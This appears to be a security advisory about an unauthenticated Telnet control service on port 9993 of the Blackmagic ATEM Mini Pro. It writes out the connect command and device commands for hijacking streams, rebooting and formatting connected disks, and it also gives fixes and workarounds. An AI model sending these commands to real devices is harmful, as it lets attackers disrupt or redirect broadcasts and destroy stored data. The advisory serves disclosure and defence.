# Blackmagic ATEM Mini Pro – Code Execution via Telnet (Port 9993)

## Description:
The Blackmagic ATEM Mini Pro exposes an undocumented Telnet service on TCP port 9993, which accepts unauthenticated plaintext commands for controlling streaming, recording, formatting storage devices, and system reboot. This interface, referred to as the "ATEM Ethernet Protocol 1.0", provides complete device control without requiring credentials or encryption. An attacker on the same network (or with remote access to the exposed port) can exploit this interface to execute arbitrary streaming commands, erase disks, or shut down the device — effectively gaining full remote control.

## Product
**Blackmagic Design – ATEM Mini Pro**  
**Firmware/Software Version:** 2.7

## Vulnerability Type
**Code Execution (CE)**

## Affected Component(s)
- Telnet Service on Port 9993
- Streaming Control Interface

## Attack Vector(s)
An unauthenticated attacker with network access to port `9993` can send raw text commands over Telnet to control and alter device functionality. This includes launching or stopping live streams, changing configurations, formatting connected drives, and rebooting the system.

---

## Vulnerable Endpoint
- **Port:** `9993`
- **Protocol:** Telnet (Blackmagic ATEM Ethernet Protocol 1.0)

## Exploit Example
  
  ```sh
  telnet <target-ip> 9993
  ```
## Example Output:
  ```sh
  Connected to <target-ip>.
  Escape character is '^]'.
  
  500 connection info:
  protocol version: 1.0
  model: ATEM Mini Pro
  friendly name: ATEM Mini Pro
  unique id: 316b239a63ea45b9bf47fedc5ca480c0
  ```

# Available Exploitable Commands:

   * Start Streaming:
     ```sh
     stream start: url: rtmps://example.com/live key: stream-key
     ```
   * Start Streaming with Custom Bitrate:
     ```sh
     stream start: url: rtmps://example.com/live key: stream-key bitrate: 3000000
     ```
   * Stop Streaming:
     ```sh
     stream stop
     ```
   * Reboot Device:
     ```sh
     reboot
     ```
   * Record Video:
     ```sh
     record
     record: name: hacked_clip
     ```
   * Format Connected Disk:
     ```sh
     format: slot id: 0 prepare: exFAT name: hacked
     format: confirm: <token>
     ```
# CE
you can use on of this tools
* https://pypi.org/project/pyatem/
* https://github.com/roygdavis/ATEMWeb
* https://github.com/filiphanes/atem-live-controller

## Proof of Concept (PoC) for(CE,Information Disclosure)
<img width="1718" height="868" alt="Image" src="https://github.com/user-attachments/assets/bf0ea3b8-9553-42a0-945a-982c1794295f" />

https://github.com/user-attachments/assets/357c0349-e275-466f-a97c-7eca4d189a3f

## Impact

This vulnerability allows attackers to:

    Start or stop live streams to arbitrary destinations.

    Reboot or crash the device remotely.

    Format connected storage media (potential data loss).

    Control recording functionality.

    Modify streaming settings without authorization.

All of this is possible without any authentication.

## Suggested Fixes

    Restrict access to port 9993 via firewall rules.

    Disable Telnet service, if not in use.

    Update firmware if Blackmagic Design releases a patched version.

    Implement authentication for command access in future firmware releases.

## Workarounds

    Block port 9993 on external-facing firewalls and routers.

    Use VLANs or isolated management networks to separate control interfaces from public access.

    Monitor device network activity for unexpected command patterns.


